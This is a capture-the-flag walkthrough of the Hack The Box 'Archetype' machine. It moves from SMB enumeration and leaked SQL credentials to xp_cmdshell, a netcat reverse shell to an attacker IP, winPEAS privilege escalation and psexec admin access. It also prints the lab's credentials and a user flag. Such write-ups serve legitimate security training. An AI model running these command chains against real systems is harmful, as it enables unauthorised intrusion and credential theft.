# **- HTB - Archetype**    
### MSSQL, enum4linux, public SMB shares
<br>

```
ip=10.129.190.66
```
### **Processs:**
<br>
   
1. Standard nmap scan 


>nmap $ip -sV -sC -oN nmap/initial -A 

Interesting results:
```
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
```
2. List SMB shares if any
>  smbclient -N -L $ip

Interesting results:
```
    Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
3. Spot the public 'backups' share, connect and get contents

> smbclient -N \\\\$ip\\backups \
> ls \
> get prod.dtsConfig


4. After cat'ing out the file we see a nice plain text domain/user and password
```
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
```
5. Had to google what the hell 'IMPacket' was but the sytax is just;
> python3 mysqlclient.py Archetype\sql_svc@$ip -windows-auth

6. More google'ing for xp_cmdshell - found a walkthrough for how to enable
7. From here we have *a* shell but not a very good one - time to stablize!
    - Step 1: no netcat on the windows box so we need to download and move that over via a python http server, then standard reverse shell from there
> python3 -m http.server  `- from within the directory containing the nc.exe file` \
> wget http://10.10.14.53:8000/nc.exe -OutFile C:\\Users\\Public\\nc.exe `- from the Windows reverse shell`\
> nc -lvnp 7890  \
> xp_cmdshell "C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.14.53 7890" `- on your SQL terminal`

1. From here we have a windows cmd terminal - `type C:\Users\sql_svc\Desktop\user.txt` and we have our user flag - nice.
```
3e7b102e78218e935bf3f4951fec21a3
```
9. Now, we are on the box as sql_svc but have no admin rights - time for prvesc. Apparently the tool for this job is "winPEAS" linpeas windows alternative.
> python3 -m http.server `- from within the directory containing the winPEASx64.exe file` \
> powershell.exe `- from the Windows reverse shell`\
> wget http://10.10.14.53:8000/winPEASx64.exe -OutFile C:\\Users\\Public\\winPEASx64.exe `- from the Windows reverse shell`\
> C:\\Users\\Public\\winPEASx64.exe `- from the Windows reverse shell`
10. WinPEAS showed us an interesting file in `...PowerShell\PSReadLine\ConsoleHost_history.txt` \
which when cat'd out gives us the admin password
```
/user:administrator MEGACORP_4dm1n!!
```
11. home stretch - Back all the way out to our local linux terminal, run psexec.py (part of IMPacket) using the following syntax
> psexec.py administrator@$ip

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This will drop you into an administrator cmd shell - *boom, challenge complete.*  
